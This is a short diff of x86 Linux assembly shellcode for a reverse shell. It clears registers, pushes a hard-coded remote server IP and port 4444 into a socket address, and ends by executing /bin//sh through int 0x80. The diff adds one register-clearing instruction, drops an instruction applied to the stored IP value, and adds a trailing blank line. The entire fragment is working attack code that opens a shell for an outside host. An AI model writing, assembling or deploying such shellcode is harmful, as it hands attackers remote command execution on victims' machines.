@@ -7,6 +7,7 @@ section .text
 
     ; clear required registers
     xor   eax, eax
+    xor   ebx, ebx
     xor   ecx, ecx
     xor   edx, edx
 
@@ -14,7 +15,6 @@ section .text
     push  eax
     push  eax             ; [$esp]: 8 bytes of padding
     mov   ebx, 0xc405210a ; Remote server IP
-    xor   ebx, eax
     push  ebx             ; [$esp]: IP
     push  word 0x5c11     ; [$esp]: 4444
     push  word 0x02       ; [$esp]: AF_INET
@@ -56,3 +56,4 @@ section .text
     mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
     mov   al, 0x0b
     int   0x80
+
